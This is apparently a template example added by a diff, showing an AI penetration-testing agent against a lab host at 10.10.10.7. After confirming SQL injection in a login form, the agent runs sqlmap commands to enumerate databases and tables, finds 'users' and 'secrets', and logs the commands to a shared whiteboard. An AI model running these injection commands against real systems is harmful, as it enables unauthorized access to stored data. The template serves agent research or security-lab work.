@@ -1,0 +1,48 @@
+[Task: Extract data from the database on 10.10.10.7]
+ 
+# Whiteboard Index:
+
+## sqli_surface:
+**Description**: username parameter on /login is injectable (error-based, MySQL).
+### Content
+Manual test: single quote in username field returned MySQL syntax error. Confirmed \
+injectable. Stack: PHP/MySQL on port 80.
+ 
+Tool: {ThinkTool.name}
+Input: The whiteboard confirms the injection point. I will enumerate databases and tables, \
+then update the entry with whatever I find.
+Output: (no observation)
+ 
+Tool: <terminal>
+Input: sqlmap -u "http://10.10.10.7/login" --data="username=*&password=x" --technique=E --dbs --batch
+Output:
+available databases:
+[*] information_schema
+[*] appdb
+ 
+Tool: <terminal>
+Input: sqlmap -u "http://10.10.10.7/login" --data="username=*&password=x" --technique=E -D appdb --tables --batch
+Output:
+Database: appdb
+[2 tables]
++---------+
+| users   |
+| secrets |
++---------+
+ 
+Tool: {ThinkTool.name}
+Input: I now have database and table names. The existing sqli_surface entry only captured the injection point. \
+I update it with the new findings before proceeding to data extraction.
+Output: (no observation)
+ 
+Tool: {WhiteboardWrite.name}
+Input:
+  name="sqli_surface"
+  description="username on /login is injectable; appdb contains tables users and secrets."
+  content="Injection confirmed via error-based MySQL on username field.\\n
+  Enumerated databases: information_schema, appdb.\\n
+  appdb tables: users, secrets.\\n
+  Commands:\\n
+  sqlmap -u 'http://10.10.10.7/login' --data='username=*&password=x' --dbs --batch\\n
+  sqlmap -u 'http://10.10.10.7/login' --data='username=*&password=x' -D appdb --tables --batch"
+Output: Wrote finding sqli_surface.
